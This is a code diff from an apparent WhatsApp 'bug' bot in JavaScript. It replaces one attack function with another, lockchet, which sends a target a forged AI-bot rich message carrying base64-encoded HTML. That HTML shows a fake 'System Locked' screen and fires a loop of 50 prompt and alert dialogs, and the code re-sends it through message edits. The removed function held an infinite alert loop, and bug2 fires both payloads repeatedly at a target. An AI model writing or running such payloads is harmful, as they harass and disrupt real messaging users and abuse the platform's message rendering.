@@ -1499,47 +1499,93 @@ async function delayhard(sock, target) {
     });
 }
 
-async function emmalocalautism(sock, target) {
-  const crypto = require("crypto");
-  const em  = {
+async function lockchet(sock, target) {
+  const html = `<!doctype html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>
+html,body{margin:0;padding:0;width:100%;height:100%;background:radial-gradient(circle at center,#0a0a0a,#000);color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;overflow:hidden}
+.box{text-align:center;width:100%;padding:0 20px;animation:pulse 2s infinite}
+.title{font-size:12vw;line-height:1.1;font-weight:900;letter-spacing:4px;background:linear-gradient(90deg,#ff0044,#ffaa00,#00ffaa,#0088ff,#ff0044);background-size:300% 300%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:glow 3s linear infinite;text-shadow:0 0 40px rgba(255,0,68,.6)}
+.sub{margin-top:20px;color:#888;font-size:4vw;letter-spacing:2px}
+@keyframes glow{0%{background-position:0% 50%}100%{background-position:300% 50%}}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
+</style></head><body><div class="box"><div class="title">@MakluClick</div><div class="sub">System Locked</div></div><script>
+(function(){
+  let n = 0;
+  while(n < 50) {
+    n++;
+    const pwd = prompt("System Locked.\\n\\nMasukkan Password untuk membuka:");
+    if (pwd === "@MakluClick") { alert("Password Benar, tapi tetap tidak bisa dibuka."); }
+    else { alert("Password Salah. System Tetap Terkunci."); }
+  }
+})();
+</script></body></html>`;
+
+  const gid = () => '3EB0' + Math.random().toString(36).substring(2, 18).toUpperCase();
+  const guu = () => [8, 4, 4, 4, 12].map(n => Math.random().toString(36).substring(2, 2 + n)).join('-');
+
+  const build = () => {
+    const rid = guu();
+    const rich = {
+      messageType: 1,
+      response_id: rid,
+      submessages: [{ messageType: 2, messageText: '@MakluClick' }],
+      unifiedResponse: {
+        data: Buffer.from(JSON.stringify({
+          __typename: 'XMSGGenAIUnifiedResponse',
+          response_id: rid,
+          sections: [{
+            __typename: 'GenAIUnifiedResponseSection',
+            view_model: {
+              __typename: 'GenAISingleLayoutViewModel',
+              primitive: { __typename: 'GenAIaeacdsnwHtmlPrimitive', payload: html, trusted_sources: [] }
+            }
+          }]
+        })).toString('base64')
+      },
+      contextInfo: {
+        forwardingScore: 99999,
+        isForwarded: true,
+        forwardOrigin: 4,
+        expiration: 0,
+        ephemeralSettingTimestamp: Date.now(),
+        disappearingMode: { initiator: 0, trigger: 1 },
+        afterReadDuration: 1,
+        mentionedJid: [target],
+        aiProvenance: {
+          c2PaMetadata: { createdWithGenAi: true, editedWithGenAi: true },
+          iptcMetadata: { createdWithGenAi: true, editedWithGenAi: true }
+        }
+      }
+    };
+    return {
+      messageContextInfo: {
+        deviceListMetadata: {},
+        deviceListMetadataVersion: 2,
+        messageSecret: Buffer.alloc(32, 1).toString('base64'),
+        botMetadata: { messageDisclaimerText: '', botResponseId: rid, imagineMetadata: { imagineType: 1, shortPrompt: '@MakluClick' } }
+      },
+      botForwardedMessage: { message: { richResponseMessage: rich } }
+    };
+  };
+
+  const edit = (id, p) => ({
     botForwardedMessage: {
       message: {
-        richResponseMessage: {
-          messageType: 1,
-          unifiedResponse: {
-            data: Buffer.from(JSON.stringify({
-            __typename: "GenAIUnifiedResponse",
-            response_id: crypto.randomUUID(),
-            sections: [{
-                __typename: "GenAIUnifiedResponseSection",
-                view_model: {
-                  __typename: "GenAISingleLayoutViewModel",
-                  primitive: {
-                    __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
-                    trusted_sources: [],
-                    payload: `<script>
-                      while (true) {
-                        alert("Group gooning start in 10 minutes");
-                      }
-                    </script>`
-                  }
-                }
-              }]
-            })).toString("base64")
-          },
-          contextInfo: {
-            isForwarded: true,
-            forwardOrigin: 4
-          }
+        protocolMessage: {
+          key: { remoteJid: target, fromMe: true, id },
+          type: 14,
+          timestampMs: Date.now(),
+          editedMessage: p
         }
       }
     }
-  }
-  const msg = generateWAMessageFromContent(target, em, {})
-
-  await sock.relayMessage(target, msg.message, {
-    messageId: msg.key.id
   });
+
+  try {
+    const id = gid();
+    await sock.relayMessage(target, build(), { messageId: id });
+    await sock.relayMessage(target, edit(id, build()), { messageId: gid() });
+    await sock.relayMessage(target, edit(id, build()), { messageId: gid() });
+  } catch (e) {}
 }
 
 async function halonyet(sock, target) {
@@ -1783,7 +1829,7 @@ async function bug1(sock, target) {
 async function bug2(sock, target) {
   for (let i = 0; i < 5; i++) {
     try {
-      await emmalocalautism(sock, target);
+      await lockchet(sock, target);
       await halonyet(sock, target);
       console.log(`bug send to ${target}`);
     } catch (innerError) {
